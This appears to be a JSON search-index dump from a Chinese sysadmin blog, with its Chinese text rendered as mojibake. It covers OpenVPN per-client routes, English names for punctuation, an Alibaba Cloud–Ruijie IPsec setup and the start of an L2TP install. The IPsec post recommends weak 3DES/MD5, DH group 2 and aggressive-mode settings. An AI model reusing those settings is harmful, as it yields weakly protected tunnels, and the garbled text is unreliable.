ä¸Šé¢æˆ‘ä»¬å›ºå®šäº†IPï¼Œä¹Ÿæ¨é€äº†ç‰¹å®šè·¯ç”±ï¼Œé‚£ä¹ˆæ€ä¹ˆçŸ¥é“ä¸€ä¸ªå®¢æˆ·çš„ ip å‘¢ï¼Œå»çœ‹ ipp æ–‡ä»¶ï¼š\ncat /etc/openvpn/conf/ipp.txt zhangranrui,172.18.0.8 æ³¨æ„ï¼Œä¸Šé¢æ–‡ä»¶é‡Œçš„ 172.18.0.8 ä¸æ˜¯ ip ï¼Œæ˜¯ ç½‘æ®µ åœ°å€\n172.18.0.9 æ˜¯ç½‘å…³åœ°å€ï¼Œ172.18.0.10æ‰æ˜¯çœŸæ­£çš„ IP åœ°å€ï¼Œæ‰€ä»¥ä¸è¦æé”™äº†\nä¹Ÿå¯ä»¥é’ˆå¯¹ç”¨æˆ·æ¨é€ä¸€äº›å…¶ä»–é€‰é¡¹ã€‚\n","permalink":"https://rendoumi.com/posts/20221119-openvpn_client/","summary":"\u003cp\u003eå…¬å¸ç”¨çš„ OpenVPN ï¼Œç ”å‘éƒ¨é—¨å’Œæ™®é€šå‘˜å·¥çš„æƒé™ä¸ä¸€æ ·ï¼ŒæŠ€æœ¯éƒ¨é—¨éœ€è¦è®¿é—®æœåŠ¡å™¨ï¼Œæ™®é€šå‘˜å·¥åˆ™ä¸éœ€è¦\u003c/p\u003e\n\u003cp\u003eè¿™æ ·çš„è¯å°±éœ€è¦æ ¹æ®ç”¨æˆ·å®šåˆ¶è·¯ç”±äº†ï¼ŒæŠ€æœ¯éƒ¨é—¨æ¨é€ç‰¹å®šçš„è·¯ç”±ï¼Œæ™®é€šå‘˜å·¥ä¸æ¨é€ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆåšæ³•å¦‚ä¸‹ï¼Œåœ¨ server.conf åšå¦‚ä¸‹è®¾å®šï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifconfig-pool-persist /etc/openvpn/conf/ipp.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eclient-config-dir /etc/openvpn/conf/static\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¬¬ä¸€è¡Œæ˜¯æŒ‡å®šè®°å½• ip åœ°å€çš„æ–‡ä»¶ï¼Œä½œç”¨æ˜¯å¦‚æœæœåŠ¡å™¨è¿›ç¨‹é‡å¯äº†ï¼Œé‡å¯åä¼šè¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œå®¢æˆ·ç«¯é‡æ–°æ‹¨å·åè·å¾—çš„ IP å°±ä¸ä¼šå˜ï¼Œè¿˜æ˜¯é‡å¯å‰çš„ IPã€‚\u003c/p\u003e\n\u003cp\u003eç¬¬äºŒè¡Œæ˜¯æŒ‡å®šäº†å®¢æˆ·ç«¯çš„å•ç‹¬é…ç½®\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬å‡è®¾ä¸€ä¸ªç”¨æˆ·æ˜¯ zhangranruiï¼Œé‚£ä¹ˆå°±å» /etc/openvpn/conf/static ä¸‹å»ºç«‹ä¸€ä¸ª zhangranrui çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# å‰é¢æ˜¯å®¢æˆ·ç«¯å›ºå®šIPåœ°å€ï¼Œåé¢æ˜¯ç½‘å…³åœ°å€\r\nifconfig-push 172.18.0.10 172.18.0.9\r\n\r\n# æ¨é€è·¯ç”±ï¼Œåé¢æ˜¯æ©ç \r\npush \u0026#34;route 10.10.0.0 255.255.0.0\u0026#34;\r\n\r\n# é‡å®šå‘å®¢æˆ·ç«¯çš„æ‰€æœ‰æµé‡ï¼Œå¦åˆ™è®¿é—®æœåŠ¡ç«¯å†…ç½‘è¦åƒä¸Šé¢ä¸€æ ·æ¨é€è·¯ç”±\r\n# push \u0026#34;redirect-gateway def1\u0026#34;\r\n\r\n# æ¨é€ç»™å®¢æˆ·ç«¯çš„DNSè§£æåœ°å€\r\n# push \u0026#34;dhcp-option DNS 223.5.5.5\u0026#34;\r\n# push \u0026#34;dhcp-option DNS 114.114.114.114\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¸Šé¢æˆ‘ä»¬å›ºå®šäº†IPï¼Œä¹Ÿæ¨é€äº†ç‰¹å®šè·¯ç”±ï¼Œé‚£ä¹ˆæ€ä¹ˆçŸ¥é“ä¸€ä¸ªå®¢æˆ·çš„ ip å‘¢ï¼Œå»çœ‹ ipp æ–‡ä»¶ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/openvpn/conf/ipp.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ezhangranrui,172.18.0.8\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼Œä¸Šé¢æ–‡ä»¶é‡Œçš„ 172.18.0.8 ä¸æ˜¯ ip ï¼Œæ˜¯ \u003cstrong\u003eç½‘æ®µ\u003c/strong\u003e åœ°å€\u003c/p\u003e\n\u003cp\u003e172.18.0.9 æ˜¯ç½‘å…³åœ°å€ï¼Œ172.18.0.10æ‰æ˜¯çœŸæ­£çš„ IP åœ°å€ï¼Œæ‰€ä»¥ä¸è¦æé”™äº†\u003c/p\u003e","title":"OpenVPNå®¢æˆ·ç«¯å®šåˆ¶IPå’Œè·¯ç”±"},{"content":"é¢è¯• infosys çš„æ—¶å€™æ˜¯ä¸€ä¸ªå°åº¦è€å“¥åšè€ƒå®˜ï¼Œä»–é—®æˆ‘çš„é—®é¢˜æˆ‘æ˜¯ä¸€å¥éƒ½å¬ä¸æ‡‚çš„ï¼Œç¡®å®æ˜¯å¬ä¸æ‡‚ã€‚\nç„¶åä»–æŠŠé—®é¢˜åœ¨ webex ä¸­æ‰“å‡ºæ¥æˆ‘å›ç­”çš„ã€‚\nå…¶ä¸­æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼šå¦‚ä½•ç”¨CLIæŸ¥å‡ºç³»ç»Ÿä¸­å†…å­˜å ç”¨æœ€é«˜çš„5ä¸ªè¿›ç¨‹\nps aux --sort=-%mem | head -n 5 ä¸Šé¢ä¸€å¥å¦‚ä½•ç”¨è‹±è¯­è¡¨è¾¾å‡ºæ¥å‘¢ï¼Œä¸å¥½è¯´å•Š\næ‰€ä»¥è®°å½•ä¸€ä¸‹ï¼Œä»¥å¤‡å°†æ¥ä¸æ—¶ä¹‹éœ€\nï¼ period å¥å·\rï¼Œ comma é€—å·\rï¼š colon å†’å·\rï¼› semicolon åˆ†å·\rï¼ exclamation æƒŠå¹å·\rï¼Ÿ question é—®å·\r- hyphen è¿å­—ç¬¦\r* asterisk æ˜Ÿå·\r\u0026#39; apostrophe æ‰€æœ‰æ ¼ç¬¦å·ï¼Œå•è¯å†…éƒ¨çš„çœç•¥\râ€” dash ç ´æŠ˜å·\r_ underscore\râ€˜ â€™ single quotation marks å•å¼•å·\râ€œ â€ double quotation marks åŒå¼•å·\r( ) round brackets åœ†æ‹¬å·\r[ ] square brackets æ–¹æ‹¬å·\r\u0026lt;\u0026gt; Angle brackets å°–æ‹¬å·\r{} curly brackets or braces å¤§æ‹¬å·\rã€Š ã€‹French quotes æ³•æ–‡å¼•å·ï¼›ä¹¦åå·\r... ellipsis çœç•¥å·\rÂ¨ tandem colon åŒç‚¹å·\r\u0026#34; ditto åŒä¸Š\râ€– parallel åŒçº¿å·\rï¼ slash æ–œçº¿å·\rï¼† ampersand = and\rï½ tilde æ³¢æµªå·\rÂ§ section; division åˆ†èŠ‚å·\râ†’ arrow ç®­å·ï¼›å‚è§å·\r| vertical bar ç«–çº¿\rbackslash åæ–œçº¿\r% percent ç™¾åˆ†å· ","permalink":"https://rendoumi.com/posts/20221117-sign/","summary":"\u003cp\u003eé¢è¯• infosys çš„æ—¶å€™æ˜¯ä¸€ä¸ªå°åº¦è€å“¥åšè€ƒå®˜ï¼Œä»–é—®æˆ‘çš„é—®é¢˜æˆ‘æ˜¯ä¸€å¥éƒ½å¬ä¸æ‡‚çš„ï¼Œç¡®å®æ˜¯å¬ä¸æ‡‚ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åä»–æŠŠé—®é¢˜åœ¨ webex ä¸­æ‰“å‡ºæ¥æˆ‘å›ç­”çš„ã€‚\u003c/p\u003e\n\u003cp\u003eå…¶ä¸­æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼šå¦‚ä½•ç”¨CLIæŸ¥å‡ºç³»ç»Ÿä¸­å†…å­˜å ç”¨æœ€é«˜çš„5ä¸ªè¿›ç¨‹\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eps aux --sort=-%mem | head -n 5\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¸Šé¢ä¸€å¥å¦‚ä½•ç”¨è‹±è¯­è¡¨è¾¾å‡ºæ¥å‘¢ï¼Œä¸å¥½è¯´å•Š\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥è®°å½•ä¸€ä¸‹ï¼Œä»¥å¤‡å°†æ¥ä¸æ—¶ä¹‹éœ€\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-javascripts\" data-lang=\"javascripts\"\u003eï¼ period å¥å·\r\nï¼Œ comma é€—å·\r\nï¼š colon å†’å·\r\nï¼› semicolon åˆ†å·\r\nï¼ exclamation æƒŠå¹å·\r\nï¼Ÿ question é—®å·\r\n-  hyphen è¿å­—ç¬¦\r\n* asterisk æ˜Ÿå·\r\n\u0026#39; apostrophe æ‰€æœ‰æ ¼ç¬¦å·ï¼Œå•è¯å†…éƒ¨çš„çœç•¥\r\nâ€” dash ç ´æŠ˜å·\r\n_ underscore\r\nâ€˜ â€™ single quotation marks å•å¼•å·\r\nâ€œ â€ double quotation marks åŒå¼•å·\r\n( ) round brackets åœ†æ‹¬å·\r\n[ ] square brackets æ–¹æ‹¬å·\r\n\u0026lt;\u0026gt; Angle brackets å°–æ‹¬å·\r\n{} curly brackets or braces å¤§æ‹¬å·\r\nã€Š ã€‹French quotes æ³•æ–‡å¼•å·ï¼›ä¹¦åå·\r\n... ellipsis çœç•¥å·\r\nÂ¨ tandem colon åŒç‚¹å·\r\n\u0026#34; ditto åŒä¸Š\r\nâ€– parallel åŒçº¿å·\r\nï¼ slash æ–œçº¿å·\r\nï¼† ampersand = and\r\nï½ tilde æ³¢æµªå·\r\nÂ§ section; division åˆ†èŠ‚å·\r\nâ†’ arrow ç®­å·ï¼›å‚è§å·\r\n| vertical bar ç«–çº¿\r\nbackslash åæ–œçº¿\r\n% percent ç™¾åˆ†å·\n\u003c/code\u003e\u003c/pre\u003e","title":"è‹±è¯­çš„ç¬¦å·è¡¨è¾¾"},{"content":"ç°åœ¨ä¹Ÿå¼€å§‹æèµ·æ¡Œé¢è¿ç»´äº†ï¼Œå…¶å®è¿˜æ„Ÿè§‰è›®æœ‰æ„æ€çš„ã€‚\nå…¬å¸çš„ä¸»è·¯ç”±å™¨æ˜¯é”æ·çš„NBR6205-Eï¼Œä½œä¸ºIPSecçš„æœåŠ¡ç«¯ï¼Œè€Œé˜¿é‡Œäº‘ä½œä¸ºå®¢æˆ·ç«¯ã€‚\né¦–å…ˆå…ˆæ™®åŠä¸€ä¸‹IPSecçš„çŸ¥è¯†ï¼ŒIPSecç›®å‰åªæ”¯æŒIPv4å•æ’­ï¼š\nå¯†é’¥å®‰å…¨æœ‰ IKE è´Ÿè´£ï¼›æ•°æ®å®‰å…¨æ–¹é¢ï¼Œæœ‰ IPSec è´Ÿè´£ã€‚\nä½†æ˜¯IKEä¹Ÿæ˜¯ IPSec çš„ ä¸€ éƒ¨åˆ†ï¼Œä¸èƒ½ç‹¬ç«‹å­˜åœ¨ã€‚å­˜åœ¨ä¸¤ä¸ªSAåˆ†åˆ«ä¸º\nISAKMP Security Associationï¼ˆIKE SAï¼‰\nIPsec Security Associationï¼ˆIPsec SAï¼‰\nåœ¨è¿™é‡Œæ³¨æ„ä¸€ç‚¹å°±æ˜¯IKE SA=ISAKMP SA\nIKE SAçš„ lifetime é»˜è®¤ä¸º 86400 ç§’ï¼Œå³ä¸€å¤©ï¼Œé»˜è®¤æ²¡æœ‰volume limitã€‚\nç”¨æˆ·çš„æ•°æ®æµé‡çœŸæ­£æ˜¯åœ¨ IPsec SA ä¸Šä¼ é€’çš„ï¼Œè€Œä¸æ˜¯åœ¨IKE SAï¼›\nIPsec SAç›´æ¥ä¸ºç”¨æˆ·æ•°æ®æµæœåŠ¡ï¼ŒIPsec SAä¸­çš„æ‰€æœ‰å®‰å…¨ç­–ç•¥éƒ½æ˜¯ä¸ºäº†ç”¨æˆ·æ•°æ®æµçš„å®‰å…¨ã€‚\nIPsec SAçš„ lifetime é»˜è®¤ä¸º3600 ç§’ï¼Œå³1å°æ—¶ï¼›é»˜è®¤volume limitä¸º4608000 Kbytesï¼Œå³4.608 Gbyteã€‚\nå› ä¸ºSAæœ‰ä¸¤ä¸ªï¼Œåˆ†ä¸ºIKE SAå’ŒIPsec SAï¼Œä¸¤ä¸ªSAåˆ†åˆ«å®šä¹‰äº†å¦‚ä½•ä¿æŠ¤å¯†é’¥ä»¥åŠå¦‚ä½•ä¿æŠ¤æ•°æ®ï¼Œå…¶å®è¿™ä¸¤ä¸ªSAéƒ½æ˜¯ç”±IKEå»ºç«‹èµ·æ¥çš„ï¼Œæ‰€ä»¥å°†IKEçš„æ•´ä¸ªè¿è¡Œè¿‡ç¨‹åˆ†æˆäº†ä¸¤ä¸ªPhaseï¼ˆé˜¶æ®µï¼‰ï¼Œå³ ï¼š\nIKE Phase Two IKE Phase One ä¸€ã€IKE Phase Oneç¬¬ä¸€é˜¶æ®µ IKE Phase Oneçš„ä¸»è¦å·¥ä½œå°±æ˜¯å»ºç«‹IKE SAï¼ˆISAKMP SAï¼‰ï¼ŒIKE SAçš„æœåŠ¡å¯¹è±¡å¹¶ä¸æ˜¯ç”¨æˆ·æ•°æ®ï¼Œè€Œæ˜¯å¯†é’¥æµé‡ï¼Œä»¥åŠä¸ºIPsec SAæœåŠ¡çš„ï¼›IKE SAçš„åå•†é˜¶æ®µè¢«ç§°ä¸ºmain modeï¼ˆä¸»æ¨¡å¼ï¼‰è¿˜æœ‰ aggressive é‡è›®æ¨¡å¼ï¼ŒIKEä¹Ÿæ˜¯éœ€è¦ä¿æŠ¤è‡ªå·±çš„æµé‡å®‰å…¨çš„ï¼ˆè¿™äº›æµé‡å¹¶éç”¨æˆ·æµé‡ï¼‰ï¼Œæ‰€ä»¥IKE SAä¹‹é—´ä¹Ÿéœ€è¦åå•†å‡ºä¸€æ•´å¥—å®‰å…¨ç­–ç•¥ï¼Œå¦åˆ™åç»­çš„å¯†é’¥å’ŒIPsec SAçš„å»ºç«‹å°±ä¸èƒ½å¾—åˆ°å®‰å…¨ä¿è¯ï¼›\nIKE SAä¹‹é—´éœ€è¦åå•†çš„å¥—å®‰å…¨ç­–ç•¥åŒ…æ‹¬ï¼š\nè®¤è¯æ–¹å¼ï¼ˆAuthenticationï¼‰\nå…±æ€»æœ‰Pre-Shared Keys (PSK)ï¼ŒPublic Key Infrastructure (PKI)ï¼ŒRSA encrypted nonceï¼Œé»˜è®¤ä¸ºPKIã€‚\nåŠ å¯†ç®—æ³•ï¼ˆEncryptionï¼‰\næ€»å…±æœ‰DESï¼Œ3DESï¼ŒAES 128ï¼ŒAES 192ï¼ŒAES 256ï¼Œé»˜è®¤ä¸ºDESã€‚\nHashç®—æ³•ï¼ˆHMACï¼‰\næ€»å…±æœ‰SHA-1ï¼ŒMD5ï¼Œé»˜è®¤ä¸ºSHA-1ã€‚\nå¯†é’¥ç®—æ³•ï¼ˆDiffie-Hellmanï¼‰\nGroups 1 ï¼ˆ768 bitï¼‰ï¼ŒGroup 2ï¼ˆ1024 bitï¼‰ï¼ŒGroup 5ï¼ˆ1536 bitï¼‰ï¼Œé»˜è®¤ä¸ºGroups 1 ï¼ˆ768 bitï¼‰ã€‚\nLifetime\néšç”¨æˆ·å®šä¹‰ï¼Œé»˜è®¤ä¸º86,400 secondsï¼Œä½†æ²¡æœ‰volume limitã€‚\näºŒã€IKE Phase Twoç¬¬äºŒé˜¶æ®µ IKE Phase Twoçš„ç›®çš„æ˜¯è¦å»ºç«‹IPsec SAï¼Œç”±äºIKE SAçš„æœåŠ¡å¯¹è±¡å¹¶ä¸æ˜¯ç”¨æˆ·æ•°æ®ï¼Œè€Œæ˜¯å¯†é’¥æµé‡ï¼Œä»¥åŠä¸ºIPsec SAæœåŠ¡çš„ï¼ŒIKE SAæ˜¯ä¸ºIPsec SAåšå‡†å¤‡çš„ï¼Œæ‰€ä»¥å¦‚æœæ²¡æœ‰IKE SAï¼Œå°±ä¸ä¼šæœ‰IPsec SAï¼›IPsec SAæ˜¯åŸºäºIKE SAæ¥å»ºç«‹çš„ï¼Œå»ºç«‹IPsec SAçš„è¿‡ç¨‹ç§°ä¸º å¿«é€Ÿæ¨¡å¼ï¼ˆquick modeï¼‰ã€‚IPsec SAæ‰æ˜¯çœŸæ­£ä¸ºç”¨æˆ·æ•°æ®æœåŠ¡çš„ï¼Œç”¨æˆ·çš„æ‰€æœ‰æµé‡éƒ½æ˜¯åœ¨IPsec SAä¸­ä¼ è¾“çš„ï¼Œç”¨æˆ·æµé‡é IPsec SAæ¥ä¿æŠ¤ï¼ŒIPsec SAåŒæ ·ä¹Ÿéœ€è¦åå•†å‡ºä¸€æ•´å¥—å®‰å…¨ç­–ç•¥ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼š\nåŠ å¯†ç®—æ³•ï¼ˆEncryptionï¼‰\næ€»å…±æœ‰DESï¼Œ3DESï¼ŒAES 128ï¼ŒAES 192ï¼ŒAES 256ï¼Œé»˜è®¤ä¸ºDESã€‚\nHashç®—æ³•ï¼ˆHMACï¼‰\næ€»å…±æœ‰SHA-1ï¼ŒMD5ï¼Œé»˜è®¤ä¸ºSHA-1ã€‚\nLifetime\néšç”¨æˆ·å®šä¹‰ï¼Œé»˜è®¤ä¸º3600 secondsï¼Œå³1å°æ—¶ï¼›é»˜è®¤volume limitä¸º4,608,000 Kbytesï¼Œå³4.608 Gbyteã€‚\næ³¨æ„ï¼šIPsec SAä¸­æ²¡æœ‰åå•†è®¤è¯æ–¹å¼ï¼ˆAuthenticationï¼‰å’Œå¯†é’¥ç®—æ³•ï¼ˆDiffie-Hellmanï¼‰ï¼Œå› ä¸ºIKE SAæ—¶å·²ç»è®¤è¯è¿‡äº†ï¼Œæ‰€ä»¥åé¢å·²ç»ä¸éœ€è¦å†è®¤è¯ï¼›å¹¶ä¸”å¯†é’¥æ˜¯åœ¨IKE SAå®Œæˆçš„ï¼Œæ‰€ä»¥åœ¨IPsec SAä¸­ä¹Ÿå°±è°ˆä¸äº†å¯†é’¥ç®—æ³•äº†ï¼Œä½†ä¹Ÿå¯ä»¥å¼ºåˆ¶å†ç®—ã€‚\nä¸Šé¢å¾ˆå•°å—¦äº†ä¸€æŠŠï¼Œä½†æ˜¯æ²¡åŠæ³•ï¼Œå› ä¸ºç­‰ä¼šè®¾ç½®çš„æ—¶å€™éƒ½è¦ç”¨åˆ°çš„ã€‚\nä¸‰ã€è®¾ç½®é”æ·è·¯ç”±å™¨ å‚æ•°ç»Ÿç»Ÿæå–ä¸€ä¸‹ï¼š\nå¯¹ç«¯IPï¼šå°±æ˜¯é˜¿é‡Œäº‘å®¢æˆ·ç«¯é‚£è¾¹çš„IPï¼Œ47.94.106.58\né¢„å…±äº«å¯†é’¥ï¼šä¸¤è¾¹éƒ½å…±äº«çš„ä¸€ä¸²å­—ç¬¦ä¸²\nIPSecéš§é“ç”Ÿå‘½å‘¨æœŸï¼šè¿™é‡Œåº”è¯¥æ˜¯ç¬¬äºŒé˜¶æ®µçš„æ—¶é—´ï¼Œ28800ç§’\nIKE ç­–ç•¥ï¼šç¬¬ä¸€é˜¶æ®µçš„IKEè®¾ç½®\næœºå¯†ç®—æ³•ï¼š3DES æ•£åˆ—ç®—æ³•ï¼šMD5 DHç»„ï¼šGroup2 ç”Ÿå‘½å‘¨æœŸï¼š28800ç§’\nè½¬æ¢é›†1ï¼šesp-3des esp-md5-hmac\nè½¬æ¢é›†2ï¼šesp-3des esp-sha-hmac\nå®Œç¾å‘å‰åŠ å¯†ï¼šgroup2(1024-bit)\nDPDæ¢æµ‹ç±»å‹ï¼šperiodic\nDPDæ¢æµ‹å‘¨æœŸï¼š30ç§’\nåå•†æ¨¡å¼ï¼šé‡è›®æ¨¡å¼\nåº”ç”¨åˆ°æ¥å£ï¼šGi0/7\néœ€ç»éš§é“è®¿é—®çš„ç½‘æ®µ\næœ¬åœ°ç½‘æ®µï¼š10.8.0.0/255.255.252.0 æ€»éƒ¨ç½‘æ®µ(å…¶å®å°±æ˜¯å¯¹ç«¯é˜¿é‡Œçš„vpcç½‘æ®µ)ï¼š10.10.240.0/255.255.240.0 å››ã€é…ç½®é˜¿é‡Œäº‘çš„IPSec 1ã€é¦–å…ˆè®¾ç½®VPNç½‘å…³ 2ã€å»ºç«‹ç”¨æˆ·ç½‘å…³ 3ã€å»ºç«‹IPsecè¿æ¥ 4ã€ç¼–è¾‘IPsecè¿æ¥ ä¸Šé¢é…ç½®è¦æ³¨æ„ï¼ŒVPNç½‘å…³å’Œç”¨æˆ·ç½‘å…³é€‰ä¹‹å‰åŠ å¥½çš„ï¼Œæœ¬ç«¯ç½‘æ®µå’Œå¯¹ç«¯ç½‘æ®µå’Œé”æ·è·¯ç”±å™¨ä¸Šæ˜¯ç›¸åçš„ã€‚é¢„å…±äº«å¯†é’¥æ˜¯ä¸€æ ·ã€‚\nå¦å¤–å°±æ˜¯æ„Ÿå…´è¶£æµæ¨¡å¼ï¼Œé€‰äº†è¿™ä¸ªï¼Œå°±éœ€è¦åœ¨è·¯ç”±è¡¨é‡Œæ‰‹åŠ¨å‘å¸ƒè·¯ç”±ï¼ï¼\nå†æ¥å°±æ˜¯é«˜çº§é…ç½®ï¼Œç¬¬ä¸€éƒ¨åˆ†IKEé…ç½®\næ³¨æ„å‚æ•°ï¼Œåå•†æ¨¡å¼ aggressive å°±æ˜¯é‡è›®æ¨¡å¼ã€‚\nç¬¬äºŒéƒ¨åˆ†IPsecé…ç½®ï¼š\nç„¶åéœ€è¦åˆ°VPNç½‘å…³ï¼Œå› ä¸ºé€‰äº†æ„Ÿå…´è¶£è·¯ç”±ï¼Œæ‰€ä»¥IPSecå»ºç«‹å¥½äº†ï¼Œè¿™é‡Œçš„ç­–ç•¥è·¯ç”±è¡¨ä¼šå‡ºç°ä¸€æ¡è·¯ç”±\næºï¼š10.10.240/21 ç›®æ ‡ï¼š10.8.0.0/22ï¼ŒçŠ¶æ€æ˜¯æœªå‘å¸ƒï¼Œç‚¹ä¸€ä¸‹å‘å¸ƒã€‚å°±å¥½äº†\nè¿™æ ·ä¸¤ç«¯çš„ IPSec å°±å»ºç«‹å¥½äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20221115-ipsec/","summary":"\u003cp\u003eç°åœ¨ä¹Ÿå¼€å§‹æèµ·æ¡Œé¢è¿ç»´äº†ï¼Œå…¶å®è¿˜æ„Ÿè§‰è›®æœ‰æ„æ€çš„ã€‚\u003c/p\u003e\n\u003cp\u003eå…¬å¸çš„ä¸»è·¯ç”±å™¨æ˜¯é”æ·çš„NBR6205-Eï¼Œä½œä¸ºIPSecçš„æœåŠ¡ç«¯ï¼Œè€Œé˜¿é‡Œäº‘ä½œä¸ºå®¢æˆ·ç«¯ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå…ˆæ™®åŠä¸€ä¸‹IPSecçš„çŸ¥è¯†ï¼ŒIPSecç›®å‰åªæ”¯æŒIPv4å•æ’­ï¼š\u003c/p\u003e\n\u003cp\u003eå¯†é’¥å®‰å…¨æœ‰ IKE è´Ÿè´£ï¼›æ•°æ®å®‰å…¨æ–¹é¢ï¼Œæœ‰ IPSec è´Ÿè´£ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯IKEä¹Ÿæ˜¯ IPSec çš„ ä¸€ éƒ¨åˆ†ï¼Œä¸èƒ½ç‹¬ç«‹å­˜åœ¨ã€‚å­˜åœ¨ä¸¤ä¸ªSAåˆ†åˆ«ä¸º\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eISAKMP Security Associationï¼ˆIKE SAï¼‰\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIPsec Security Associationï¼ˆIPsec SAï¼‰\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eåœ¨è¿™é‡Œæ³¨æ„ä¸€ç‚¹å°±æ˜¯IKE SA=ISAKMP SA\u003c/p\u003e\n\u003cp\u003eIKE SAçš„ lifetime é»˜è®¤ä¸º 86400 ç§’ï¼Œå³ä¸€å¤©ï¼Œé»˜è®¤æ²¡æœ‰volume limitã€‚\u003c/p\u003e\n\u003cp\u003eç”¨æˆ·çš„æ•°æ®æµé‡çœŸæ­£æ˜¯åœ¨ IPsec SA ä¸Šä¼ é€’çš„ï¼Œè€Œä¸æ˜¯åœ¨IKE SAï¼›\u003c/p\u003e\n\u003cp\u003eIPsec SAç›´æ¥ä¸ºç”¨æˆ·æ•°æ®æµæœåŠ¡ï¼ŒIPsec SAä¸­çš„æ‰€æœ‰å®‰å…¨ç­–ç•¥éƒ½æ˜¯ä¸ºäº†ç”¨æˆ·æ•°æ®æµçš„å®‰å…¨ã€‚\u003c/p\u003e\n\u003cp\u003eIPsec SAçš„ lifetime é»˜è®¤ä¸º3600 ç§’ï¼Œå³1å°æ—¶ï¼›é»˜è®¤volume limitä¸º4608000 Kbytesï¼Œå³4.608 Gbyteã€‚\u003c/p\u003e\n\u003cp\u003eå› ä¸ºSAæœ‰ä¸¤ä¸ªï¼Œåˆ†ä¸ºIKE SAå’ŒIPsec SAï¼Œä¸¤ä¸ªSAåˆ†åˆ«å®šä¹‰äº†å¦‚ä½•ä¿æŠ¤å¯†é’¥ä»¥åŠå¦‚ä½•ä¿æŠ¤æ•°æ®ï¼Œå…¶å®è¿™ä¸¤ä¸ªSAéƒ½æ˜¯ç”±IKEå»ºç«‹èµ·æ¥çš„ï¼Œæ‰€ä»¥å°†IKEçš„æ•´ä¸ªè¿è¡Œè¿‡ç¨‹åˆ†æˆäº†ä¸¤ä¸ªPhaseï¼ˆé˜¶æ®µï¼‰ï¼Œå³ ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIKE Phase Two\u003c/li\u003e\n\u003cli\u003eIKE Phase One\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"ä¸€ike-phase-oneç¬¬ä¸€é˜¶æ®µ\"\u003eä¸€ã€IKE Phase Oneç¬¬ä¸€é˜¶æ®µ\u003c/h4\u003e\n\u003cp\u003eIKE Phase Oneçš„ä¸»è¦å·¥ä½œå°±æ˜¯å»ºç«‹IKE SAï¼ˆISAKMP SAï¼‰ï¼ŒIKE SAçš„æœåŠ¡å¯¹è±¡å¹¶ä¸æ˜¯ç”¨æˆ·æ•°æ®ï¼Œè€Œæ˜¯å¯†é’¥æµé‡ï¼Œä»¥åŠä¸ºIPsec SAæœåŠ¡çš„ï¼›IKE SAçš„åå•†é˜¶æ®µè¢«ç§°ä¸ºmain modeï¼ˆä¸»æ¨¡å¼ï¼‰è¿˜æœ‰ aggressive é‡è›®æ¨¡å¼ï¼ŒIKEä¹Ÿæ˜¯éœ€è¦ä¿æŠ¤è‡ªå·±çš„æµé‡å®‰å…¨çš„ï¼ˆè¿™äº›æµé‡å¹¶éç”¨æˆ·æµé‡ï¼‰ï¼Œæ‰€ä»¥IKE SAä¹‹é—´ä¹Ÿéœ€è¦åå•†å‡ºä¸€æ•´å¥—å®‰å…¨ç­–ç•¥ï¼Œå¦åˆ™åç»­çš„å¯†é’¥å’ŒIPsec SAçš„å»ºç«‹å°±ä¸èƒ½å¾—åˆ°å®‰å…¨ä¿è¯ï¼›\u003c/p\u003e","title":"é˜¿é‡Œäº‘IPSecä¸é”æ·è·¯ç”±å™¨å¾—è¿æ¥"},{"content":"è¿™æ˜¯ä¸ªå¾ˆå¥‡æ€ªçš„äº‹æƒ…ï¼Œåº”è˜äº†ä¸€å®¶æ CDN çš„å…¬å¸ï¼Œç»“æœä¸Šå»çœ‹äº†ä¸€ä¸‹æ ¹æœ¬ä¸å¯¹è·¯ã€‚å°±ç«‹åˆ»è¾äº†ï¼Œä½†æ˜¯å‘ç°å®ƒç»™å‘˜å·¥å¼€çš„ L2TP VPN ç¡®å®éå¸¸å¥½ç”¨ã€‚\näºæ˜¯å°±è‡ªå·±ä¹Ÿæ­ä¸€ä¸ªï¼Œæ–¹ä¾¿è‡ªç”¨ã€‚ä¸‹é¢è®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ï¼Œç¯å¢ƒæ˜¯CentOS 7\nä¸€ã€è£…L2TP # yum install epel-release # yum install 